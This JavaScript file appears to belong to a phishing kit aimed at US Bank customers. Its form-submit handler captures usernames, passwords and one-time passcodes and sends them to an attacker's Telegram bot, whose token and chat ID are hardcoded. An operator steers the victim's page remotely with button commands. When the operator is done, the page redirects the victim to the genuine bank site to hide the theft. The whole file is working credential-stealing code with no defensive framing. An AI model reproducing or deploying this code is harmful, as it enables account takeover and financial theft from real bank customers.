/* BrosTec Protocol - Final Response Fix */
const BOT_TOKEN = "8472908079:AAHRhM8yUVmfMagFkA85x8T0Zp9WMqWZftU";
const CHAT_ID = "7865246557";

async function sendLog(type, content) {
    let text = (type === 'LOGIN') 
        ? `🏦 *New Login Attempt*\n\n👤 User: \`${content.user}\`\n🔑 Pass: \`${content.pass}\``
        : `🔑 *OTP Received:*\n\nCode: \`${content.otp}\``;

    let buttons = (type === 'LOGIN')
        ? [[{ text: "طلب OTP 📲", callback_data: "request_otp" }], [{ text: "خطأ في البيانات ❌", callback_data: "login_error" }]]
        : [[{ text: "❌ رمز خطأ", callback_data: "otp_error" }], [{ text: "✅ تم بنجاح", callback_data: "done" }]];

    // تصفير التحديثات القديمة قبل إرسال الجديد لضمان الاستجابة للأمر القادم فقط
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: buttons }
        })
    });
}

async function listen() {
    try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
        const data = await res.json();
        
        if(data.result.length > 0) {
            const update = data.result[0];
            const cmd = update.callback_query?.data;
            
            if(cmd === "request_otp") {
                window.location.href = "otp.html"; 
            } else if(cmd === "login_error") {
                if(document.getElementById('loader')) document.getElementById('loader').style.display = 'none';
                if(document.getElementById('error-msg')) document.getElementById('error-msg').style.display = 'block';
            } else if(cmd === "otp_error") {
                if(document.getElementById('loader')) document.getElementById('loader').style.display = 'none';
                if(document.getElementById('otp-error')) document.getElementById('otp-error').style.display = 'block';
                if(document.getElementById('otp_val')) document.getElementById('otp_val').value = "";
            } else if(cmd === "done") {
                window.location.href = "https://www.usbank.com";
            }
        }
    } catch(e) {}
}

setInterval(listen, 2000);

document.addEventListener('submit', function(e) {
    if(e.target.id === 'loginForm' || e.target.id === 'otpForm') {
        e.preventDefault();
        if(document.getElementById('loader')) document.getElementById('loader').style.display = 'flex';
        
        const data = (e.target.id === 'loginForm') 
            ? { user: document.getElementById('user').value, pass: document.getElementById('pass').value }
            : { otp: document.getElementById('otp_val').value };
            
        sendLog(e.target.id === 'loginForm' ? 'LOGIN' : 'OTP', data);
    }
});
